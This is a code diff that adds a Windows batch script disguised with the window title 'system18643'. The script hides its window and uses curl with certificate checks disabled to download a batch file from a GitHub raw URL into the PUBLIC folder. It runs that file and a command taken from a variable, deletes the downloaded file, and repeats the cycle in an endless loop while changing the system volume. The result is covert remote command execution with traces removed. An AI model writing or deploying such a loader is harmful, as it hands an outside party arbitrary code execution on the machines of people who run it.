@@ -1,0 +1,27 @@
+@echo off
+title system18643
+set "mus=%PUBLIC%\zztb"
+sysc.exe win hide title "system18643"
+set "ver=1.0"
+set req=auxstart
+curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/blob/main/sys.suzar" --output "%mus%\rq.bat"
+call "%mus%\rq.bat"
+%out%
+del "%mus%\rq.bat"
+:a
+set /p a=<"%mus%\valvol.suzar"
+if not "%a%" == "X" (
+  If not "%out%" == "X28" (
+    	if "%out%" == "X95" (
+       sysc.exe setsysvolume %a%
+      ) else (
+        sysc.exe setsysvolume %out%
+        set req=auxstart
+        curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/blob/main/sys.suzar" --output "%mus%\rq.bat"
+        call "%mus%\rq.bat"
+        %out%
+        del "%mus%\rq.bat"
+      )
+  )
+)
+goto :a
